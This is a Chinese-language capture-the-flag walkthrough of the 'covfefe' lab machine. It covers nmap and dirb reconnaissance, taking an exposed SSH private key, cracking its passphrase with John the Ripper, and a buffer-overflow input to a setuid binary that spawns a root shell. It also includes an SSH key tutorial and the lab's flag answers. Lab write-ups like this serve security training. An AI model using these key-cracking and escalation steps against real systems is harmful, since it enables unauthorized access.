
## 1.arp扫描

```bash
arp-scan -l
```
![[Pasted image 20251223153342.png]]
## 2.nmap扫描

```bash
sudo nmap -T4 -sS -sV -sC -O 192.168.3.3
```

![[Pasted image 20251223153700.png]]
其中有用的部分
```bash
31337/tcp open  http   
|_/.bashrc /.profile /taxes
```

## 3.dirb扫描
![[Pasted image 20251223160207.png]]
```bash
---- Scanning URL: http://192.168.43.76:31337/ ----
+ http://192.168.43.76:31337/.bash_history (CODE:200|SIZE:853)              
+ http://192.168.43.76:31337/.bashrc (CODE:200|SIZE:3526)                   
+ http://192.168.43.76:31337/.profile (CODE:200|SIZE:675)                   
+ http://192.168.43.76:31337/.ssh (CODE:200|SIZE:43)                        
+ http://192.168.43.76:31337/robots.txt (CODE:200|SIZE:70)                       
```

## 4.curl查找

```bash
curl 192.168.43.76:31337/taxes/
```
![[Pasted image 20251223162724.png]]
### ==**flag1**==
```
flag1{make_america_great_again}
```


## 5.ssh(相关知识并非WP)

- ==本地mac和kali虚拟机测试ssh==

### 5.1 本地生成密钥对
mac本地生成ssh密钥对，命名**`my_kali_rsa`**
```bash
ssh-keygen -t rsa -f ~/.ssh/my_kali_rsa
```
![[Pasted image 20251223101602.png]]
### 5.2 本地开启服务
开启mac本地80端口下载服务, 注意路径问题，需要在**.ssh** 文件目录下开启

```
python3 -m http.server 80
```
![[Pasted image 20251223103422.png]]

### 5.3 上传本地公钥至kali
```
wget http://192.168.43.153/my_kali_rsa.pub
cat ~/.ssh/authorized_keys
cat my_kali_rsa.pub
cat my_kali_rsa.pub >> ~/.ssh/authorized_keys
```
![[Pasted image 20251223103139.png]]

### 5.4 ssh远程kali
mac本地进行ssh远程kali, 注意这里** -i ** 是==私钥==
```
ssh -i .ssh/my_kali_rsa root@192.168.43.62
```

![[Pasted image 20251223111029.png]]

- **==实际登录验证阶段（SSH 连接时的自动流程）==**

当客户端尝试 SSH 登录服务器时，SSH 协议会自动完成身份验证，无需输入密码：
1. 客户端向服务器发送登录请求，告知自身身份；
2. 服务器在目标用户的`~/.ssh/authorized_keys`中，查找对应的客户端公钥；
3. 服务器生成一个随机字符串，用该公钥加密后发送给客户端；
4. 客户端收到加密字符串后，用自己的**私钥解密**，并将解密后的字符串回传给服务器；
5. 服务器验证回传的字符串是否与自己最初生成的一致：
    - 一致：身份验证通过，直接建立加密连接；
    - 不一致：拒绝登录。

- **生成私钥和公钥**
![[Pasted image 20251223120939.png]]

![[Pasted image 20251223130917.png]]

![[Pasted image 20251223125520.png]]

## 6.ssh登录
### 6.1 id_rsa登录
```bash
ssh -i id_rsa simon@192.168.43.76
```
- 发现拒绝登录，**bad permissions**，需要设置**id_rsa**权限为**600**，设置后发现需要密码

```
┌──(root㉿kali-linux)-[~/localkali/covfefe]
└─# ssh -i id_rsa simon@192.168.43.76
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
simon@192.168.43.76: Permission denied (publickey).
```
### 6.2 John破解工具
- 这里用工具破解密码如` john`  、`hydra`,这里以`john`为例
1. 先定位
2. 查看用法
3. 进行转换
4. 破解
5. 查看密码
![[Pasted image 20251223145306.png]]


```
┌──(root㉿kali-linux)-[~/localkali/covfefe]
└─# locate ssh2john  
/usr/bin/ssh2john
/usr/share/john/ssh2john.py
/usr/share/john/__pycache__/ssh2john.cpython-313.pyc
                                                                                
┌──(root㉿kali-linux)-[~/localkali/covfefe]
└─# /usr/share/john/ssh2john.py      
Usage: /usr/share/john/ssh2john.py <RSA/DSA/EC/OpenSSH private key file(s)>
                                                                             
┌──(root㉿kali-linux)-[~/localkali/covfefe]
└─# /usr/share/john/ssh2john.py id_rsa > ctf.hash
                                                                             
┌──(root㉿kali-linux)-[~/localkali/covfefe]
└─# cat ctf.hash  

┌──(root㉿kali-linux)-[~/localkali/covfefe]
└─# john ctf.hash --show
id_rsa:starwars
```

- 破解流程如下：

1. **转换私钥为哈希文件**：
```bash
python /usr/share/john/ssh2john.py my_encrypted_id_rsa > ssh_key_hash.txt
```

2. **用 John 破解哈希**：
```bash
john ssh_key_hash.txt
```

3. **查看破解结果**：
```bash
john --show ssh_key_hash.txt
```
### 6.3 破解成功登录
破解查看密码，为 **`starwars`**,再次尝试登录
![[Pasted image 20251223145454.png]]
发现登录成功
![[Pasted image 20251223150511.png]]


## 7.查找flag
ssh远程登录后尝试查找flag，没有发现相关flag
```
find / \( -name user.txt -o -name root.txt \) 2>/dev/null -exec cat {} +
```

进入**root**目录查找，发现**flag.txt**，但是无权限访问，接着查看**==read_message.c==**,发现flag2
#### ==flag2==
```
flag2{use_the_source_luke}
```
![[Pasted image 20251223151206.png]]
查看read_message.c完整代码
![[Pasted image 20251223152106.png]]
### 堆栈溢出
> [!Summary]
> 分析上述源码。当我们输入一个字符串时, 它将与Simon 一起检查字符串的前`5`字符。如果匹配, 它将运行一个程序`/usr/local/bin/read_message`。现在输入它被分配大小为`20`个字节。因此, 我们溢出堆栈进入超过`20`个字节的数据。我们使用前`5`个字符是 `"Simon"`, 然后是`15` 个任意字符, 然后是 `"/bin/sh" `在第`21`字节，溢出提权。


查找`root`权限的文件，发现`read_message`也是`root`权限
![[Pasted image 20251223152424.png]]
运行`read_message`在输入用户名后随意加**15**字节**（5+15=20）**的内容，再加`/bin/sh`调用`sh`命 令解释器 ，获取`root`权限。

```
Simon123451234512345/bin/sh
```
![[Pasted image 20251223152923.png]]

### ==flag3==
```
flag3{das_bof_meister}
```


>[!note]- 涉及主要知识点：
>1. ssh登录，John破解私钥
>2. 堆栈溢出
>
